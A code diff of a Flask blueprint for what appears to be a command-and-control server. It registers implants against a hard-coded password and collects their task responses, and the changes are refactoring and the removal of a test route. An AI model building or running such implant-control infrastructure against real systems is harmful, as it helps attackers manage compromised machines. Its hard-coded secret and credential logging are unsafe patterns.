@@ -1,16 +1,18 @@
 # rpc blueprint - Implant <--> Server
 
 from flask import Blueprint, request , abort 
-from cvnt.implant_pb2 import * 
-from cvnt.database import db
-from cvnt.models import *
+
+from implant_pb2 import * 
+
 from flask_wtf.csrf import *
+
+from db_operations import *
 
 from constants import *
 
 rpc = Blueprint("rpc", __name__)
 
-password = "SUPER_COMPLEX_PASSWORD_WOWZA!!!"
+PASSWORD = "SUPER_COMPLEX_PASSWORD_WOWZA!!!"
 
 @rpc.route("/register", methods=["POST"])
 def handle_register():
@@ -24,7 +26,7 @@ def handle_register():
     print(f'[+]    * Username: {register.Username}')
     print(f'[+]    * Password: {register.Password}')
     
-    if register.Password != password:
+    if register.Password != PASSWORD:
         abort(404)
 
     print(f'[+] Password is bueno.')
@@ -85,14 +87,4 @@ def receive_task_response():
         print(f"Error receiving task response: {e}")
         return str(e), 500
 
-'''
-@rpc.route("/testpb", methods=["POST"])
-def handle_pbtest():
-    print(f'TEST PB ROUTE THING')
-    register = RegisterImplant()
-    req_data = request.get_data()
-    register.ParseFromString(req_data)
-    print(register)
-    return ""
-'''
 
